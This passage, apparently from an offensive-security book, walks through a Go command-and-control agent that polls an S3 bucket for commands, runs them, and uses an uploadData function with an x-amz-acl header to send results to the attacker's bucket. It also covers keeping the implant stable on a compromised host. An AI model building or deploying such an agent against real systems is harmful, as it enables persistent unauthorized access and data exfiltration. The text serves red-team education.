  md: "If the file has been altered since the last visit (HTTP status code 200 indicates\
    \ an alteration), then new commands are available for execution via the execCmd\
    \ method. Otherwise, we receive an HTTP 304 (Not Modified) response and silently\
    \ try again in a few seconds.\n\nNOTE I won’t go into ETag headers here, but if\
    \ you want to know more, check out https://www.logicbig.com/.\n\nResults are then\
    \ sent back to the bucket (via the uploadData method). The next section, shown\
    \ in Listing 6-5, creates the uploadData method.\n\n```\n```go\nfunc uploadData(client\
    \ *http.Client, url string, data []byte) error {\n    req, err := http.NewRequest(\"\
    PUT\", url, bytes.NewReader(data))\n    req.Header.Add(\"x-amz-acl\", \"bucket-owner-full-control\"\
    )\n    _, err = client.Do(req)\n    return err\n}\n```\n```\n\nListing 6-5: The\
    \ uploadData method of the agent\n\nThe uploadData method is a classic HTTP PUT\
    \ request, but here we have one small extra subtlety: the x-amz-acl header. This\
    \ header instructs AWS to transfer ownership of the uploaded file to the destination\
    \ bucket owner, which is us. Otherwise, the file would keep its original ownership\
    \ and we wouldn’t be able to use the S3 API to retrieve it. If you’re curious\
    \ about the anatomy of the functions execCmd, fetchData, and uploadData, do not\
    \ hesitate to check out the code in the book’s GitHub repo.\n\nThe first crucial\
    \ requirement in writing such an agent is stability. We will drop it behind enemy\
    \ lines, so we need to properly handle all errors and edge cases. The wrong exception\
    \ could crash the agent and, with it, our remote access. Who knows if the template\
    \ injection vulnerability will still be there the next day?\n\nGolang takes care\
    \ of exceptions by not having them in the first place. Most calls return an error\
    \ code that should be checked before moving forward. As long as we religiously\
    \ follow this practice, along with a couple of other good coding practices like\
    \ checking for nil pointers before dereferencing, we should be relatively safe.\
    \ Second comes concurrency. We do not want to lose the program because it is busy\
    \ running a find command that drains the agent’s resources for 20 minutes. That’s\
    \ why we encapsulated the execCmd and uploadData methods in a goroutine (prefix\
    \ go func()...).\n\nThink of a goroutine as a set of instructions running in parallel\
    \ to the rest of the code. All routines share the same thread as the main program,\
    \ thus sparing a few data structures and the expensive context switching usually\
    \ performed by the kernel when jumping from one thread to another. To give you\
    \ a practical comparison, a goroutine allocates around 4KB of memory, whereas\
    \ an OS thread roughly takes 1MB. You can easily run hundreds of thousands of\
    \ goroutines on a regular computer without breaking a sweat."
